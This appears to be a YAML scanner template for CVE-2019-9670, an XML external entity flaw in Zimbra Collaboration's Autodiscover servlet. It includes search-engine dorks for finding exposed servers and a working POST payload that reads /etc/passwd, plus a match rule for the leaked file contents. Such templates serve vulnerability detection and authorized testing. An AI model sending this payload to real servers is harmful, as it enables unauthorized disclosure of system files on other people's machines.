id: CVE-2019-9670

info:
  name: Synacor Zimbra Collaboration <8.7.11p10 - XML External Entity Injection
  author: ree4pwn
  severity: critical
  verified: false
  description: |
    Synacor Zimbra Collaboration Suite 8.7.x before 8.7.11p10 has an XML external entity injection (XXE) vulnerability via the mailboxd component.
    shodan:
      - http.title:"zimbra collaboration suite"
      - http.title:"zimbra web client sign in"
    fofa:
      - title="zimbra web client sign in"
      - title="zimbra collaboration suite"
    google:
      - intitle:"zimbra collaboration suite"
      - intitle:"zimbra web client sign in"
  reference:
    - https://www.exploit-db.com/exploits/46693/
    - https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories
    - https://bugzilla.zimbra.com/show_bug.cgi?id=109129
    - http://www.rapid7.com/db/modules/exploit/linux/http/zimbra_xxe_rce
    - http://packetstormsecurity.com/files/152487/Zimbra-Collaboration-Autodiscover-Servlet-XXE-ProxyServlet-SSRF.html
    - https://isc.sans.edu/forums/diary/CVE20199670+Zimbra+Collaboration+Suite+XXE+vulnerability/27570/
    - https://nvd.nist.gov/vuln/detail/CVE-2019-9670
  tags: cve,cve2019,zimbra,xxe,kev,edb,packetstorm,synacor,vkev,vuln
  created: 2023/08/10

rules:
  r0:
    request:
      method: POST
      path: /Autodiscover/Autodiscover.xml
      headers:
        Content-Type: application/xml
      body: |
        <!DOCTYPE xxe [
        <!ELEMENT name ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
        <Request>
        <EMailAddress>aaaaa</EMailAddress>
        <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
        </Request>
        </Autodiscover>
    expression: |
      response.status == 503 &&
      response.body.bcontains(b"Problem accessing") &&
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
